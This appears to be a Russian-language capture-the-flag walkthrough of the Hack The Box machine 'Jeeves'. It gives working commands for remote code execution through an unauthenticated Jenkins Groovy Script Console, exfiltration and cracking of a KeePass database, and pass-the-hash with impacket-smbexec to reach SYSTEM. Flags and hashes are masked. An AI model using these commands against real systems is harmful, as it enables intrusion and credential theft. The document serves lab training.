# Jeeves (HTB)

> Платформа: Hack The Box  
> ОС: Windows  
> Сложность: Средне  
> Результат: Administrator

---

## Цепочка Атаки

```text
Разведка
  |-- nmap -p- -> 80 (IIS 10.0 Ask Jeeves), 135, 445, 50000 (Jetty 9.4.z)
  |-- Перебор директорий на 50000 -> /askjeeves (Jenkins 2.87)
Первичный Доступ
  |-- Анонимная Script Console на /askjeeves/script
  |-- Выполнение Groovy -> выполнение команд от jeeves\kohsuke
  |-- Чтение user flag из C:\Users\kohsuke\Desktop\user.txt
Повышение Привилегий
  |-- База KeePass CEH.kdbx в C:\Users\kohsuke\Documents
  |-- keepass2john + john -> мастер-пароль <KEEPASS_PASSWORD>
  |-- NT-хэш Administrator извлечён из KeePass
  |-- impacket-smbexec с -hashes -> SYSTEM-шелл
  |-- dir /R -> hm.txt:root.txt:$DATA (alternate data stream)
  |-- Чтение root flag из ADS
```

> [!NOTE]
> Все флаги, пароли, хеши и токены сессий были замаскированы по этическим соображениям.

---

## Брифинг Машины

Jeeves - Windows-хост, который поднимает IIS на 80-м порту, SMB на 445 и Jetty на высоком порту. Jetty хостит развёртывание Jenkins, спрятанное за нестандартным context path. Jenkins позволяет анонимный доступ к Groovy Script Console, что даёт прямое выполнение команд от сервисной учётной записи. Из этого контекста база KeePass в профиле пользователя выдаёт NT-хэш локального администратора, который переиспользуется через pass-the-hash. Итоговый root flag спрятан в alternate data stream, прикреплённом к безобидному текстовому файлу на рабочем столе администратора.

## Разведка

Полное сканирование TCP и определение сервисов:

```bash
$ nmap -p- --min-rate 5000 -Pn 10.129.228.112
...
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
```

Порт 80 отдаёт маленькую статическую страницу с заголовком "Ask Jeeves". Порт 50000 - контейнер Jetty, который на корне возвращает 404. Ни листинг директорий, ни заголовки HTTP не раскрывают context path Jenkins напрямую, поэтому фаззим обе поверхности небольшим словарём:

```bash
$ gobuster dir -q -u http://10.129.228.112:50000/ -w /usr/share/wordlists/dirb/common.txt -t 30
...
/askjeeves  (Status: 302)
```

Переход по редиректу ведёт на дашборд Jenkins по адресу /askjeeves/. В подвале страницы указано "Jenkins ver. 2.87". В правом верхнем углу отображается "log in", значит используется анонимная учётная запись. Запрос /askjeeves/script возвращает HTTP 200 и рендерит Groovy Script Console без аутентификации.

## Первичный Доступ

No CVE (custom vulnerability) - Jenkins Groovy Script Console доступна без аутентификации; анонимный доступ к административному интерфейсу позволяет выполнять произвольный Groovy-код от имени сервисной учётной записи Jenkins.

Script Console принимает POST с телом вида script=<groovy code>. Jenkins требует CSRF crumb, поэтому сначала получаем cookie сессии и crumb:

```bash
$ cookie=$(mktemp)
$ crumb=$(curl -s -c $cookie -b $cookie -A 'Mozilla/5.0' \
    http://10.129.228.112:50000/askjeeves/script \
    | grep -oP 'Jenkins-Crumb", "\K[^"]+')
$ echo $crumb
<JENKINS_CRUMB>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Подтверждаем выполнение команд безвредной командой:

```bash
$ curl -s -b $cookie -A 'Mozilla/5.0' -H "Jenkins-Crumb: $crumb" \
    --data-urlencode 'script=println "whoami".execute().text' \
    http://10.129.228.112:50000/askjeeves/script \
    | sed -n '/<h2>Result<\/h2><pre>/,/<\/pre>/p' | sed '1s/.*<pre>//; $s/<\/pre>.*//'
jeeves\kohsuke
```

Сервисная учётная запись - jeeves\kohsuke. Через тот же Groovy-канал смотрим профиль и читаем user flag:

```bash
$ curl ... --data-urlencode 'script=println new File("C:/Users/kohsuke/Desktop/user.txt").text' ...
<USER_FLAG>
```

В папке Documents лежит база KeePass, которая пригодится для повышения привилегий:

```bash
$ curl ... --data-urlencode 'script=println new File("C:/Users/kohsuke/Documents").list().join("\n")' ...
AppData
Desktop
Documents
...
```

## Повышение Привилегий

Переносим C:/Users/kohsuke/Documents/CEH.kdbx на атакующий хост. Простейший путь - кодировать файл в base64 через Script Console и вставить локально:

```bash
$ curl ... --data-urlencode 'script=println new File("C:/Users/kohsuke/Documents/CEH.kdbx").bytes.encodeBase64().toString()' ... > kdbx.b64
$ base64 -d kdbx.b64 > CEH.kdbx
$ file CEH.kdbx
CEH.kdbx: Keepass password database 2.x KDBX
```

Извлекаем хэш и ломаем мастер-пароль через John:

```bash
$ keepass2john CEH.kdbx > ceh.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt ceh.hash
...
<KEEPASS_PASSWORD>       (CEH)
$ john --show ceh.hash
CEH:<KEEPASS_PASSWORD>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Открываем базу через keepassxc-cli. Запись "Backup stuff" содержит NT-хэш локального администратора:

```bash
$ keepassxc-cli show -s -a Password CEH.kdbx "Backup stuff"
<ADMIN_NT_HASH>
```

Переиспользуем хэш через pass-the-hash. wmiexec на этом хосте виснет, а smbexec работает, потому что требует только cmd.exe на цели:

```bash
$ impacket-smbexec -hashes '<ADMIN_NT_HASH>' \
    -dc-ip 10.129.228.112 'jeeves/Administrator@10.129.228.112'
C:\Windows\system32>
```

Перечисляем alternate data streams на рабочем столе администратора:

```text
C:\Windows\system32> cmd.exe /c dir /R C:\Users\Administrator\Desktop
...
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
...
```

Читаем скрытый поток:

```text
C:\Windows\system32> cmd.exe /c powershell -c "Get-Content -Path C:\Users\Administrator\Desktop\hm.txt -Stream root.txt"
<ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

## Флаги

| Флаг | Значение |
|------|----------|
| User | `<USER_FLAG>` |
| Root | `<ROOT_FLAG>` |

## Ключевые Выводы

- Jenkins Script Console - находка высокого импакта. Если она доступна анонимно, это прямой примитив RCE вне зависимости от версии Jenkins.
- wmiexec полагается на Win32_Process.Create и часто виснет за Defender или медленным WMI-провайдером; smbexec - более лёгкая альтернатива, которой нужны только SMB и cmd.exe.
- Pass-the-hash работает против локальных учётных записей Administrator даже при неизвестном открытом пароле, если удалось получить NTLM-хэш.
- Alternate data streams не видны в `dir` и `Get-Content` по умолчанию. `dir /R` и `Get-Content -Stream <name>` - канонический способ перечислить и прочитать их.
- Базы KeePass в профилях пользователей - частая находка в CTF и в реальных задачах incident response; всегда проверяй `.kdbx`-файлы на этапе post-exploitation.
